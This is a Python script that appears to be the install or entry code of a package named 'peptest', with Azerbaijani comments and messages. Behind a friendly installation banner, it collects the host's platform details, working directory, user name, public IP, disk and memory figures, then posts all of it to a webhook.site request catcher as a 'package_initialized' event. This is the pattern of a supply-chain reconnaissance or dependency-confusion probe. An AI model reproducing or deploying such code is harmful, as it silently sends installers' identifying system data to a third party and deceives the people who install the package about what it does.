import os
import sys
import platform
import requests
import json
from datetime import datetime

def get_system_info():
    """Sistem məlumatlarını toplayır"""
    return {
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "working_directory": os.getcwd(),
        "user": os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
        "timestamp": datetime.now().isoformat()
    }

def perform_checks():
    """Müxtəlif yoxlamaları həyata keçirir"""
    checks = {}
    
    # İnternet bağlantısı yoxla
    try:
        response = requests.get("https://httpbin.org/ip", timeout=5)
        checks["internet_connection"] = True
        checks["public_ip"] = response.json().get("origin", "Unknown")
    except:
        checks["internet_connection"] = False
        checks["public_ip"] = "Unknown"
    
    # Disk məlumatları
    try:
        import psutil
        disk = psutil.disk_usage('/')
        checks["disk_total_gb"] = round(disk.total / (1024**3), 2)
        checks["disk_free_gb"] = round(disk.free / (1024**3), 2)
        checks["disk_used_percent"] = disk.percent
    except:
        checks["disk_info"] = "psutil not available"
    
    # RAM məlumatları
    try:
        import psutil
        memory = psutil.virtual_memory()
        checks["memory_total_gb"] = round(memory.total / (1024**3), 2)
        checks["memory_available_gb"] = round(memory.available / (1024**3), 2)
        checks["memory_used_percent"] = memory.percent
    except:
        checks["memory_info"] = "psutil not available"
    
    return checks

def send_results_to_webhook(system_info, checks):
    """Nəticələri webhook-a göndərir"""
    webhook_url = "https://webhook.site/33a92941-d730-4a54-9e41-d0c9a9319775"
    
    payload = {
        "event_type": "package_initialized",
        "package_info": {
            "name": "peptest",
            "version": "1.2.1"
        },
        "system_info": system_info,
        "system_checks": checks,
        "installation_time": datetime.now().isoformat()
    }
    
    try:
        response = requests.post(
            webhook_url,
            json=payload,
            headers={'Content-Type': 'application/json'},
            timeout=15
        )
        return f"✅ Məlumatlar uğurla göndərildi! Status: {response.status_code}"
    except Exception as e:
        return f"❌ Məlumat göndərilmədi: {e}"

def display_banner():
    """Gözəl banner göstərir"""
    banner = """
    ╔═══════════════════════════════════════╗
    ║          🚀 PEPTEST v1.2.1           ║
    ║    Avtomatik Quraşdırma Sistemi      ║
    ╚═══════════════════════════════════════╝
    """
    print(banner)

def main():
    """Əsas funksiya"""
    display_banner()
    
    print("🔍 Sistem məlumatları toplanır...")
    system_info = get_system_info()
    
    print("🔧 Sistem yoxlamaları aparılır...")
    checks = perform_checks()
    
    print("📊 Toplanan məlumatlar:")
    print(f"   • Sistem: {system_info['platform']} {system_info['platform_release']}")
    print(f"   • Prosesor: {system_info['processor']}")
    print(f"   • Python: {system_info['python_version']}")
    print(f"   • İstifadəçi: {system_info['user']}")
    
    if checks.get("internet_connection"):
        print(f"   • İnternet: ✅ ({checks.get('public_ip', 'Unknown')})")
    else:
        print("   • İnternet: ❌")
    
    print("🌐 Məlumatlar göndərilir...")
    result = send_results_to_webhook(system_info, checks)
    print(result)
    
    print("\n🎉 Quraşdırma və işləmə tamamlandı!")
    print("📖 Paket istifadəsi: 'peptest' və ya 'python -m peptest'")

if __name__ == "__main__":
    main()